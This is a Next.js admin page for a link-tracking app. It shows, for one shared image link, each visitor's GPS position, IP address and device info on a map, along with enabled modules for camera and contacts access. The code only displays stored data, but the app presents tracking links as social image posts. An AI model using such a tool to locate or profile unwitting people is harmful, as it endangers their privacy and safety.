import React from "react";
import Link from "next/link";
import { notFound } from "next/navigation";
import { createAdminClient } from "@/lib/supabase/admin";
import { Card } from "@/components/ui/Card";
import { Badge } from "@/components/ui/Badge";
import { Button } from "@/components/ui/Button";
import { LinkDetailMap } from "@/components/admin/LinkDetailMap";
import { VisitorSessionCard } from "@/components/admin/VisitorSessionCard";
import { ArrowLeft, Globe, ExternalLink, Users, MapPin, Eye, Clock, Sliders } from "lucide-react";
import { ImageLink, LocationSession } from "@/lib/types";
import { formatSocialTitle, isLongCaption } from "@/lib/text-utils";
import { getLinkStatusDetails } from "@/lib/link-utils";

interface PageProps {
  params: { id: string };
}

export const dynamic = "force-dynamic";
export const revalidate = 0;

export default async function AdminLinkTrackingPage({ params }: PageProps) {
  const admin = createAdminClient();

  const { data: linkData, error } = await admin
    .from("image_links")
    .select(`*, location_sessions(*, location_updates(*))`)
    .eq("id", params.id)
    .single();

  if (error || !linkData) notFound();

  const link = linkData as ImageLink & { location_sessions: LocationSession[] };
  const sessions = (link.location_sessions || []).sort((a, b) => new Date(b.consent_at).getTime() - new Date(a.consent_at).getTime());

  // Extract real visitor coordinates with device telemetry for this link's map
  const mapCoordinates = sessions.map((s) => {
    const updates = s.location_updates || [];
    if (updates.length === 0) return null;
    const sorted = [...updates].sort((a: any, b: any) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
    const latest = sorted[0];
    return {
      sessionId: s.id, latitude: latest.latitude, longitude: latest.longitude, accuracy: latest.accuracy || undefined,
      ipAddress: s.ip_address || "Unknown IP", deviceInfo: s.device_info, status: s.status, timestamp: latest.created_at,
    };
  }).filter(Boolean) as any[];

  const totalSessions = sessions.length;
  const perm = link.permissions_config;
  const smartTitle = formatSocialTitle(link.title);
  const fullCaption = link.description || link.title;
  const hasExtendedCaption = isLongCaption(link.title) || Boolean(link.description && link.description !== link.title);
  const statusInfo = getLinkStatusDetails(link);

  return (
    <div className="space-y-6">
      {/* Header & Back Link: Clean & Smart Formatted Layout */}
      <div className="space-y-2">
        <Link href="/admin/links" className="inline-flex items-center gap-1.5 text-xs text-slate-500 hover:text-slate-900 dark:text-white/50 dark:hover:text-white transition-colors">
          <ArrowLeft className="w-3.5 h-3.5" /> Back to Links
        </Link>

        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div className="space-y-1.5 min-w-0 flex-1">
            <div className="flex items-center gap-2 flex-wrap">
              <h1 className="text-base sm:text-xl font-bold text-slate-900 dark:text-white tracking-tight line-clamp-2">
                {smartTitle}
              </h1>
              <Badge variant={statusInfo.badgeVariant} className="text-[10px] sm:text-xs">
                {statusInfo.badgeLabel}
              </Badge>
            </div>
            {link.target_url && (
              <a
                href={link.target_url}
                target="_blank"
                rel="noopener noreferrer"
                className="text-xs text-amber-700 dark:text-[#FFFC00] hover:underline flex items-center gap-1 font-mono truncate"
              >
                <Globe className="w-3.5 h-3.5 shrink-0" />
                <span className="truncate">{link.target_url}</span>
                <ExternalLink className="w-2.5 h-2.5 shrink-0" />
              </a>
            )}
            <p className="text-xs text-white/50 font-mono flex items-center gap-1.5 flex-wrap">
              <span>Slug: <b className="text-white">{link.slug}</b></span>
              <span>&bull;</span>
              <span className={`inline-flex items-center gap-1 ${statusInfo.isExpired ? "text-rose-400 font-bold" : statusInfo.expiresAtFormatted ? "text-amber-300" : "text-white/40"}`}>
                <Clock className="w-2.5 h-2.5 shrink-0" />
                <span>{statusInfo.timeRemainingText}</span>
              </span>
            </p>
          </div>

          <div className="flex items-center gap-2 shrink-0 self-start sm:self-center">
            <Link href={`/view/${link.slug}`} target="_blank">
              <Button variant="secondary" size="sm" className="gap-1.5 h-8 sm:h-9 px-3 text-xs border-slate-200 dark:border-white/10 text-slate-800 dark:text-white">
                <Eye className="w-3.5 h-3.5" />
                <span>Open Viewer</span>
              </Button>
            </Link>
          </div>
        </div>

        {/* Full Caption Accordion/Card if caption is long */}
        {hasExtendedCaption && (
          <div className="p-3.5 rounded-2xl bg-slate-50 dark:bg-white/[0.03] border border-slate-200/80 dark:border-white/10 text-xs text-slate-600 dark:text-white/70 leading-relaxed max-h-36 overflow-y-auto">
            <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400 dark:text-white/40 block mb-1">
              Full Post Caption:
            </span>
            <p className="whitespace-pre-line select-text">{fullCaption}</p>
          </div>
        )}
      </div>

      {/* Metrics Row: 3-column unified native cards */}
      <div className="grid grid-cols-3 gap-1.5 sm:gap-3">
        <Card variant="glass" className="p-2.5 sm:p-4 space-y-1 rounded-xl sm:rounded-2xl border-slate-200 dark:border-white/10">
          <div className="flex items-center gap-1 sm:gap-2 text-slate-500 dark:text-white/50 text-[10px] sm:text-xs truncate">
            <Users className="w-3.5 h-3.5 text-amber-600 dark:text-[#FFFC00] shrink-0" />
            <span className="truncate">Visitors</span>
          </div>
          <p className="text-lg sm:text-2xl font-black text-slate-900 dark:text-white">{totalSessions}</p>
        </Card>

        <Card variant="glass" className="p-2.5 sm:p-4 space-y-1 rounded-xl sm:rounded-2xl border-slate-200 dark:border-white/10">
          <div className="flex items-center gap-1 sm:gap-2 text-slate-500 dark:text-white/50 text-[10px] sm:text-xs truncate">
            <MapPin className="w-3.5 h-3.5 text-emerald-500 dark:text-emerald-400 shrink-0" />
            <span className="truncate">Locations</span>
          </div>
          <p className="text-lg sm:text-2xl font-black text-slate-900 dark:text-white">{mapCoordinates.length}</p>
        </Card>

        <Card variant="glass" className="p-2.5 sm:p-4 space-y-1 rounded-xl sm:rounded-2xl border-slate-200 dark:border-white/10">
          <div className="flex items-center gap-1 sm:gap-2 text-slate-500 dark:text-white/50 text-[10px] sm:text-xs truncate">
            <Sliders className="w-3.5 h-3.5 text-blue-400 shrink-0" />
            <span className="truncate">Modules</span>
          </div>
          <div className="flex flex-wrap gap-1 pt-0.5">
            {perm?.location && <Badge variant="live" className="text-[9px] px-1.5 py-0">GPS</Badge>}
            {perm?.device_info && <Badge variant="default" className="text-[9px] px-1.5 py-0">Dev</Badge>}
            {perm?.camera && <Badge variant="default" className="text-[9px] px-1.5 py-0">Cam</Badge>}
            {perm?.contacts && <Badge variant="default" className="text-[9px] px-1.5 py-0">Cont</Badge>}
          </div>
        </Card>
      </div>

      {/* Dedicated Map for this link */}
      <div className="space-y-2">
        <h2 className="text-base font-bold text-white flex items-center gap-2">
          <MapPin className="w-4 h-4 text-[#FFFC00]" />
          Visitor Map ({mapCoordinates.length} pins)
        </h2>
        <LinkDetailMap coordinates={mapCoordinates} />
      </div>

      {/* Visitor Sessions List */}
      <div className="space-y-3">
        <h2 className="text-base font-bold text-white flex items-center gap-2">
          <Users className="w-4 h-4 text-[#FFFC00]" />
          Visitor Telemetry Logs ({sessions.length})
        </h2>

        {sessions.length === 0 ? (
          <Card variant="glass" className="p-8 text-center text-white/50 text-xs">
            No visitors have opened this link yet. Share the link to begin tracking!
          </Card>
        ) : (
          <div className="space-y-3">
            {sessions.map((session) => (
              <VisitorSessionCard key={session.id} session={session} />
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
